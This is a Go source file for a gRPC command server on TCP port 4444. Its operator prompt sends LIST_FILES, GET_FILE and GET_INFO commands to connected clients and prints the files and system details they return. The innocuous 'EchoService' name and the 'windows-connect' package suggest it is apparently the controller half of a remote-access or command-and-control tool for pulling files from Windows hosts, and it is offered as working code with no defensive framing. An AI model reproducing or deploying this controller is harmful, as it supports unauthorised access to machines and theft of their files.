package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/cardfaux/windows-connect/grpcapi"
	"google.golang.org/grpc"
	"google.golang.org/grpc/keepalive"
)

type server struct {
	grpcapi.UnimplementedEchoServiceServer
}

func (s *server) ExecuteCommand(stream grpcapi.EchoService_ExecuteCommandServer) error {
	// Receive responses concurrently
	go func() {
		for {
			msg, err := stream.Recv()
			if err != nil {
				log.Printf("Receive error: %v", err)
				return
			}
			if resp := msg.GetCommandResponse(); resp != nil {
				fmt.Printf("\nResponse:\n%s\n\n", resp.Output)
			}
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("Enter command (e.g., LIST_FILES:/ or GET_FILE:/path/to/file): ")
		if !scanner.Scan() {
			break
		}
		text := scanner.Text()
		parts := strings.SplitN(text, ":", 2)
		if len(parts) == 0 {
			fmt.Println("Invalid command format.")
			continue
		}
		cmdStr := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		// Map string command to enum
		var cmdEnum grpcapi.CommandType
		switch strings.ToUpper(cmdStr) {
		case "LIST_FILES":
			cmdEnum = grpcapi.CommandType_LIST_FILES
		case "GET_FILE":
			cmdEnum = grpcapi.CommandType_GET_FILE
		case "GET_INFO":
			cmdEnum = grpcapi.CommandType_GET_INFO
		default:
			fmt.Println("Unknown command. Valid commands: LIST_FILES, GET_FILE, GET_INFO")
			continue
		}

		err := stream.Send(&grpcapi.CommandMessage{
			Message: &grpcapi.CommandMessage_CommandRequest{
				CommandRequest: &grpcapi.CommandRequest{
					Command:  cmdEnum,
					Argument: arg,
				},
			},
		})
		if err != nil {
			log.Printf("Send error: %v", err)
			return err
		}
	}

	return nil
}

func main() {
	lis, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatalf("Listen error: %v", err)
	}

	// 🔧 Fix: store the server in a variable
	grpcServer := grpc.NewServer(
		grpc.KeepaliveParams(keepalive.ServerParameters{
			MaxConnectionIdle: 5 * time.Minute,
			Time:              2 * time.Minute,
			Timeout:           20 * time.Second,
		}),
	)

	// Register the server
	grpcapi.RegisterEchoServiceServer(grpcServer, &server{})

	fmt.Println("gRPC server listening on :4444")
	if err := grpcServer.Serve(lis); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}
